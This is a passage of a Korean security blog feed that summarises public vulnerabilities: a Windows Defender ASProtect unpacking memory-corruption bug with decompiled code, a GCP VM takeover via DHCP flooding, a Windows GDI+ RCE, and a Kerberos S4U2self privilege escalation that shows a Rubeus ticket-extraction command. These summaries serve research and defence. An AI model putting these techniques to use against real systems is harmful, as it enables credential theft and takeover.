&#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC138;&#xC694;) &#xADF8;&#xB9AC;&#xACE0; simulation.explore(find=print_good)&#xB97C; &#xD1B5;&#xD574; &#xAC12;&#xC744; &#xD0D0;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xCC3E;&#xC544;&#xC9C0;&#xBA74; &#xB05D;! &#xC9C4;&#xC9DC; &#xC27D;&#xC8E0;? &#xC544; &#xBB3C;&#xB860; &#xBB38;&#xC81C;&#xAC00; &#xC26C;&#xC6CC;&#xC11C; &#xADF8;&#xB7FD;&#xB2C8;&#xB2E4; &#xCFE0;&#xCFF8;&#x2026; &#xC544;&#xC9C1; &#xC774;&#xC815;&#xB3C4;&#xB294; &#xCC0D;&#xBA39;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218;&#xB3C4; &#xC5C6;&#xB294; &#xC218;&#xC900;&#xC774;&#xC8E0;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;&#x2026;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#x2026;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#x2026;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#x2026;</h1><p>&#xB3C4;&#xB300;&#xCCB4; angr&#xC5D0;&#xC11C;&#xB294; &#xC800; explore &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBB34;&#xC2A8; &#xC9D3;&#xC744; &#xD588;&#xAE38;&#xB798; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xAC78;&#xAE4C;&#xC694;? &#xC544;&#xB9C8; &#xC5EC;&#xB7EC;&#xBD84;&#xC774; angr&#xD558;&#xBA74; &#xB5A0;&#xC624;&#xB974;&#xB294; &#xD0A4;&#xC6CC;&#xB4DC;&#xAC00; &#xBA87; &#xAC00;&#xC9C0; &#xC788;&#xC744;&#xD150;&#xB370;, &#xBC14;&#xB85C; Symbolic Execution &#xB355;&#xBD84; &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#x2026; &#xB2E4;&#xC74C; &#xAE00; &#xC8FC;&#xC81C;&#xB294; Symbolic Execution&#xC785;&#xB2C8;&#xB2E4;!! &#xD558;&#xD558;&#x2026; &#xC774;&#xBC88; &#xD3B8;&#xB3C4; &#xC7AC;&#xBBF8;&#xB294; &#xBCC4;&#xB85C; &#xC5C6;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB294;&#xB370; &#xB2E4;&#xC74C; &#xAE00;&#xC740; &#xC5B4;&#xB5A1;&#xD558;&#xC9C0;&#x2026;&#xD558;&#xC528;</p><p>&#xADF8;&#xB798;&#xB3C4; &#xB9C8;&#xBB34;&#xB9AC;&#xB418;&#xC5C8;&#xC73C;&#xB2C8;&#xAE4C; &#xAE30;&#xC05C; &#xB9C8;&#xC74C;&#xC73C;&#xB85C; &#xD1F4;&#xADFC;!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625731445.gif" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>angr</tag>
      
      <tag>exploit</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>newbie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] mpengine: asprotect embedded runtime dll memory corruption</title>
    <link href="/2021/07/09/j0ker/2021-07-09/"/>
    <url>/2021/07/09/j0ker/2021-07-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2189">https://bugs.chromium.org/p/project-zero/issues/detail?id=2189</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender&#xB294; &#xC5EC;&#xB290; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC640; &#xAC19;&#xC774; &#xC218; &#xB9CE;&#xC740; &#xD3EC;&#xB9F7;&#xC744; &#xBD84;&#xC11D; &#xBC0F; &#xAC80;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 2018&#xB144;, &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB294; Defender&#xB97C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2F1;&#xD55C;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC9C0;&#xB9CC; &#xB514;&#xD3F4;&#xD2B8;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; Defender&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C;, &#xD30C;&#xC77C; &#xD30C;&#xC11C;, &#xC5B8;&#xD328;&#xCEE4;, &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130; &#xADF8;&#xB9AC;&#xACE0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; &#xC5EC;&#xC804;&#xD788; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Denfender&#xC5D0;&#xC11C; <code>ASProtect</code>&#xB85C; &#xD328;&#xD0B9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC5B8;&#xD328;&#xD0B9;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Defender&#xC5D0;&#xC11C;&#xB294; &#xD328;&#xD0B9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C;, &#xD328;&#xCEE4;&#xC758; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC815;&#xBCF4;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xC5B8;&#xD328;&#xD0B9;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. <code>ASProtect</code>&#xB294; &#xC5B8;&#xD328;&#xD0B9; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB0B4;&#xC7AC;&#xB41C; DLL&#xC744; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB5A8;&#xAD6C;&#xACE0;, &#xD574;&#xB2F9; DLL&#xC744; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xBA54;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC5B8;&#xD328;&#xD0B9;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xB294; DLL &#xC5ED;&#xC2DC; &#xD328;&#xD0B9;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xD2B9;&#xBCC4;&#xD55C; &#xAC80;&#xC0AC;&#xB294; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBC14;&#xB85C; &#xC774; DLL&#xC758; <code>IMAGE_SECTION_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c++">NtHdr = (IMAGE_NT_HEADERS *)((<span class="hljs-keyword">char</span> *)ImagePtr + ImagePtr-&gt;e_lfanew);NtHdr-&gt;OptionalHeader.SizeOfImage = <span class="hljs-keyword">this</span>-&gt;ImageSize;NtHdr-&gt;OptionalHeader.ImageBase = <span class="hljs-keyword">this</span>-&gt;ImageBase;NtHdr-&gt;OptionalHeader.AddressOfEntryPoint = <span class="hljs-keyword">this</span>-&gt;EntryPoint;NtHdr-&gt;OptionalHeader.SizeOfHeaders = <span class="hljs-number">4096</span>;TotalSects = <span class="hljs-keyword">this</span>-&gt;LastSection - <span class="hljs-keyword">this</span>-&gt;FirstSection) / <span class="hljs-keyword">sizeof</span>(EMBEDDED_SECTION);<span class="hljs-comment">// ...</span><span class="hljs-keyword">do</span>{  SectHdrs-&gt;VirtualAddress = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  SectHdrs-&gt;PointerToRawData = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  <span class="hljs-comment">//  IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE</span>  SectHdrs-&gt;Characteristics = <span class="hljs-number">0xE0000020</span>;  CurrSect = (EMBEDDED_SECTION *)((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span>-&gt;FirstSection + Offset);  <span class="hljs-keyword">if</span> ( SectNum &gt;= NumSects )    EndAddress = <span class="hljs-keyword">this</span>-&gt;ImageSize;  <span class="hljs-keyword">else</span>    EndAddress = CurrSect[<span class="hljs-number">1</span>].VirtualAddress;  VirtualSize = EndAddress - CurrSect-&gt;VirtualAddress;  SectHdrs-&gt;Misc.VirtualSize = VirtualSize;  SectHdrs-&gt;SizeOfRawData = VirtualSize;  StringCchPrintfA((<span class="hljs-keyword">char</span> *)SectHdrs, <span class="hljs-number">8u</span>, <span class="hljs-string">&quot;.sect%d&quot;</span>, SectNum);  memcpy_s_0(    &amp;<span class="hljs-keyword">this</span>-&gt;ImagePtr[*(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset)],    <span class="hljs-keyword">this</span>-&gt;ImageSize - *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset),    *(<span class="hljs-keyword">void</span> **)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;PointerToData + Offset),    *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;SectSize + Offset));</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; DLL&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>RVA(Relative Virtual Address)</code>&#xB97C; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, &#xC774;&#xB97C; &#xB9C8;&#xC9C0;&#xB9C9; <code>memcpy</code>&#xC5D0;&#xC11C; &#xBC84;&#xD37C;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xC784;&#xC758;&#xB85C; &#xB123;&#xC740; <code>RVA</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB420; &#xACBD;&#xC6B0;, &#xC774; &#xC791;&#xC5C5;&#xC740; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130; &#xBC16;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>defender</tag>
      
      <tag>unpacking</tag>
      
      <tag>antivirus</tag>
      
      <tag>arbitrary_read_write</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GCP VM takeover via DHCP flood attack</title>
    <link href="/2021/07/08/fabu1ous/2021-07-08/"/>
    <url>/2021/07/08/fabu1ous/2021-07-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">gcp-dhcp-takeover-code-exec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google&#x2019;s Comput Engine Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><strong>&#xC544;&#xC9C1; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</strong></p><p>ISC DHCP&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB79C;&#xB364; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC790;&#xC2E0;&#xC744; Metadata server&#xB85C; &#xAC00;&#xC7A5;&#xD558;&#xACE0; Google Cloud Platform(GCP)&#xC758; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;(VM: Virtual Machine)&#xC744; &#xC7A5;&#xC545;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISC DHCP &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; random() &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC720;&#xC0AC; &#xB09C;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xB09C;&#xC218;&#xC758; seed&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; 3&#xAC00;&#xC9C0; &#xAC12;&#xC744; &#xC870;&#xD569;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC720;&#xD6A8;&#xD55C; &#xBC94;&#xC704; &#xB0B4;&#xC5D0;&#xC11C; XID &#xC608;&#xCE21;&#xC774; &#xAC00;&#xB2A5;&#xD574; dhcilent&#xC5D0; DHCP packet&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC2DC;&#xC791;&#xB41C; &#xC2DC;&#xC810;&#xC758; unixtime</li><li>dhclient &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; pid</li><li>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xCE74;&#xB4DC; &#xC774;&#xB354;&#xB137; &#xC8FC;&#xC18C;(MAC)&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; 4 byte</li></ul><p>GCP VM&#xC740; ssh &#xACF5;&#xAC1C;&#xD0A4; &#xBD84;&#xBC30;&#xC640; &#xAC19;&#xC740; &#xCD08;&#xAE30; &#xC124;&#xC815; &#xC791;&#xC5C5;&#xC744; Metadata server&#xC5D0; &#xD06C;&#xAC8C; &#xC758;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. XID&#xC744; &#xC720;&#xCD94;&#xD55C; &#xD574;&#xCEE4;&#xB294; VM&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xACE0; &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC790;&#xC2E0;&#xC744; Metadata server&#xB85C; &#xC18D;&#xC5EC; &#xC6D0;&#xD558;&#xB294; ssh &#xACF5;&#xAC1C;&#xD0A4;&#xB97C; VM&#xC5D0; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xCEE4;&#xB294; ssh&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xC258;&#xC5D0; &#xC790;&#xC720;&#xC790;&#xC7AC;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gcp</tag>
      
      <tag>dhcp</tag>
      
      <tag>random</tag>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1665: Windows 그래픽 드라이버 원격 코드 실행 취약점</title>
    <link href="/2021/07/06/l0ch/2021-07-06/"/>
    <url>/2021/07/06/l0ch/2021-07-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-cve-2021-1665-remote-code-execution-vulnerability-in-windows-gdi/">Analyzing CVE-2021-1665 &#x2013; Remote Code Execution Vulnerability in Windows GDI+</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC758; &#xADF8;&#xB798;&#xD53D; &#xC7A5;&#xCE58; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;(Graphic Device Interface, GDI)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>gdiplus.dll</code> &#xC5D0;&#xC11C; EMF &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1; &#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>EMF : WMF &#xD30C;&#xC77C;&#xC758; &#xD655;&#xC7A5;&#xC73C;&#xB85C; &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0; &#xB610;&#xB294; &#xADF8;&#xB798;&#xD53D;&#xC744; &#xB80C;&#xB354;&#xB9C1; &#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xBA54;&#xD0C0; &#xD30C;&#xC77C;</p></blockquote><p><code>Builtline::BuildAllLines</code> &#xD568;&#xC218;&#xC5D0;&#xB294; &#xB2E4;&#xC74C; &#xB8E8;&#xD504; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>0x60</code> bytes &#xD06C;&#xAE30;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;</li><li><code>Builtline::BuiltLine</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC;</li><li><code>BuiltLine::GetUntrimmedCharacterCount</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;(1)&#xC744; &#xB8E8;&#xD504; &#xCE74;&#xC6B4;&#xD130; &#xB354;&#xD568;</li><li>&#xB8E8;&#xD504; &#xCE74;&#xC6B4;&#xD130;&#xAC00; EMF &#xD30C;&#xC77C;&#xC758; <code>Length</code> &#xD544;&#xB4DC;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xB8E8;&#xD504; &#xC885;&#xB8CC;</li></ol><p>&#xADF8;&#xB7EC;&#xB098; <code>BuiltLine::GetUntrimmedCharacterCount</code> &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774; 0&#xC774; &#xB418;&#xB294; &#xACBD;&#xC6B0;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC5C6;&#xC5B4; &#xC9C0;&#xC815;&#xB41C; <code>Length</code> &#xD544;&#xB4DC; &#xAC12; &#xC774;&#xC0C1;&#xC73C;&#xB85C; &#xB8E8;&#xD504;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC774;&#xB294; &#xB370;&#xC774;&#xD130; &#xC190;&#xC0C1;&#xACFC; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Microsoft&#xB294; <code>BuiltLine::GetUntrimmedCharacterCount</code> &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC80;&#xC0AC;&#xB97C; &#xCD94;&#xAC00;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>microsoft</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>gdi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Abusing Kerberos S4U2self local privilege escalation</title>
    <link href="/2021/07/05/idioth/2021-07-05/"/>
    <url>/2021/07/05/idioth/2021-07-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/">Abusing Kerberos S4U2self for local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Kerberos S4U2self</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD2F0;&#xCF13;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xCEF4;&#xD4E8;&#xD130; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xC99D; &#xC554;&#xD638;&#xD654; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; Kerberos&#xC758; <a href="http://www.harmj0y.net/blog/activedirectory/S4U2pwnage/">S4U2self extension&#xC744; &#xC545;&#xC6A9;</a>&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAE30;&#xC220;&#xC740; &#xC0C8;&#xB85C; &#xBC1C;&#xACAC;&#xB41C; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xBA70; <a href="https://github.com/GhostPack/Rubeus#constrained-delegation-abuse">Rubeus manual</a>&#xACFC; <a href="https://exploit.ph/revisiting-delegate-2-thyself.html">Charlie Clark&#xC758; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC5D0;&#xC11C; &#xC0C1;&#xC138; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>S4U2proxy&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C; &#xAC04;&#xC5D0; &#xC791;&#xC5C5;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xACC4;&#xC815;&#xC774; &#xD65C;&#xC131;&#xD654; &#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, SPN&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Active Directory&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xACFC; AppPool identities&#xB294; &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; &#xC5ED;&#xD560;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; MSSQL&#xC774;&#xB098;, AppPool&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; IIS &#xB4F1;&#xC774; &#xC2E4;&#xD589; &#xC911;&#xC77C; &#xACBD;&#xC6B0; S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>TGT &#xAC00;&#xC838;&#xC624;&#xAE30;</li></ol><p>S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; TGT &#xB610;&#xB294; &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; TGT&#xB294; Rubues&#xC758;<code>tgt::deleg</code> trick&#xC744; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre><ol><li>SPN &#xC218;&#xC815;</li></ol><p>&#xC704;&#xC758; TGT&#xB97C; 